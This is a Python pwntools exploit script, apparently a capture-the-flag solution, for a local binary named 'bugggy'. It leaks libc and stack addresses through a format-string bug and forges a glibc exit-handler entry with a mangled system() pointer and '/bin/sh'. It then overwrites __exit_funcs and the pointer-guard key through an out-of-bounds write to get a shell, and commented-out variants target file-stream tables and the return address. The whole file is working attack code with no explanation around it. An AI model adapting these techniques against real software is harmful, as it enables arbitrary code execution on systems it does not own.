#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

p = process('./bugggy')

def rol(num, bits):
    return ((num << bits) | (((num << bits) & 0xffffffffffffffff0000000000000000) >> 64)) & 0xffffffffffffffff

def mangle(addr):
    return rol(addr, 0x11)

name = b'%11$p%19$p'
p.sendafter(b'name ?', name)

p.recvuntil(b'hi, ')
libc  = int(p.recv(14), 16) - 0x1ed4a0
stack = int(p.recv(14), 16)
mmap  = libc + 0x22c000
ld    = libc + 0x200000
one_gadget = libc + 0xe6aee
free_hook = libc + 0x1eeb28
xor_key = libc + 0x1f3570
ret_addr = stack - 0x28
stdout = libc + 0x1ec6a0
system = libc + 0x55410 + 4

nop = libc + 0x3491f

log.info('libc  : ' + hex(libc))
log.info('ld    : ' + hex(ld))
log.info('stack : ' + hex(stack))
log.info('mmap  : ' + hex(mmap))
log.info('one_gadget : ' + hex(one_gadget))
log.info('free_hook  : ' + hex(free_hook))


# struct exit_function_list
# {
#   struct exit_function_list *next;
#   size_t idx;
#   struct exit_function fns[32];
# };

# struct exit_function
# {
#   long int flavor;
#   union
#   {
#      void (*at) (void);
#      struct
#      {
#        void (*fn) (int status, void *arg);
#        void *arg;
#      } on;
#      struct
#      {
#        void (*fn) (void *arg, int status);
#        void *arg;
#        void *dso_handle;
#      } cxa;
#   } func;
# };

payload  = b'Yes\0'.ljust(16, b'a') 
exit_function = flat(4, mangle(system), mmap + 0x50, 0) # ef_cxa
exit_function_list = flat(0, 1) + exit_function
payload += exit_function_list + b'/bin/sh'
payload += b'\n'
p.sendafter(b'wrong ?', payload)

raw_input('>')

data = mmap + 0x20

# _IO_file_jumps table
# idx = 15 # max: 21; cond: 3,4,5,7,14,15
# addr_offset = ((0x1ed4a0 + idx * 8) - (0x22c000) - 8) // 4 - 4

# overwrite return address
# addr_offset = ((ret_addr) - (mmap) - 8) // 4 - 4

# Overwrite stdin stream buf
# addr_offset = ((0x1eb988 + 0x10) - (0x22c000) - 8) // 4 - 4

# __exit_funcs
addr_offset = ((0x1eb718) - (0x22c000) - 8) // 4 - 4

# Testing
# addr_offset = 1

p.sendafter(b'2. scanf', str(data) + ' ' + str(addr_offset) + '\n')
print('go')

# Fake stdin
# payload  = b'1234\0' + p64(libc + 0x1ee4d0)
# payload += p64(0xffffffffffffffff) + p64(0)
# payload += p64(libc + 0x1eba60) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0) # p64(0xffffffff) + p64(0)
# payload += p64(0) + p64(0) # p64(0) + p64(libc + 0x1ed4a0 + 0x78)
# payload += (p64(0) + p64(0)) * 14
# payload += p64(0) + p64(0) # p64(libc + 0x1ecf60) + p64(0)
# payload += p64(0) + p64(0)
# payload += p64(0) + p64(0) # p64(libc + 0x9d570) + p64(libc + 0x9dbf0)
# payload += p64(one_gadget)
# p.sendafter(b'2. bof', payload)

target_addr = xor_key
addr_offset = (target_addr - mmap) // 8 - 4
# addr_offset = 0x1234567890a0

p.sendafter(b'2. bof', str(addr_offset) + '\n')
print('go')

p.interactive()

